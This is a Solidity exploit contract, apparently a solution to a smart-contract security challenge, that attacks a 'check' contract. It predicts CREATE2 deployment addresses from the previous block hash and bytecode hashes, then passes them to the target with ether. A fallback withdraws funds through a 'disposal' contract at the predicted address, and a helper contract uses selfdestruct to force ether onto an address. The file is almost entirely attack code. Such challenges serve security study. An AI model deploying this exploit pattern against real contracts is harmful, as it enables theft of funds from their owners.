//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "./disposal.sol";

contract attck {
    check public che;
    bytes32 public salt;
    constructor(address _che) {
        che = check(_che);
    }

    function dep() public payable {
        salt = blockhash(block.number - 1);
        che.isCompleted{value: msg.value}(figure2());
    }

    function getBytecode(bytes32 _salt) public pure returns (bytes memory) {
        bytes memory bytecode = type(deployer).creationCode;
        return abi.encodePacked(bytecode, abi.encode(_salt));
    }
    function getBytecode1(address _addr) public pure returns (bytes memory) {
        bytes memory bytecode = type(disposal).creationCode;
        return abi.encodePacked(bytecode, abi.encode(_addr));
    }

    fallback()external payable{
        disposal(figure2()).withdraw();
    }
    receive()external payable{}

    function figure1() public view returns (address) {
        return
            address(
                uint160(
                    uint256(
                        keccak256(
                            abi.encodePacked(
                                bytes1(0xff),
                                address(che),
                                salt,
                                keccak256(getBytecode(salt))
                            )
                        )
                    )
                )
            );
    }
    function figure2() public view returns (address) {
        return
            address(
                uint160(
                    uint256(
                        keccak256(
                            abi.encodePacked(
                                bytes1(0xff),
                                figure1(),
                                salt,
                                keccak256(getBytecode1(address(che)))
                            )
                        )
                    )
                )
            );
    }
}
contract self{
    constructor(address payable _addr)payable{
        selfdestruct(_addr);
    }
}
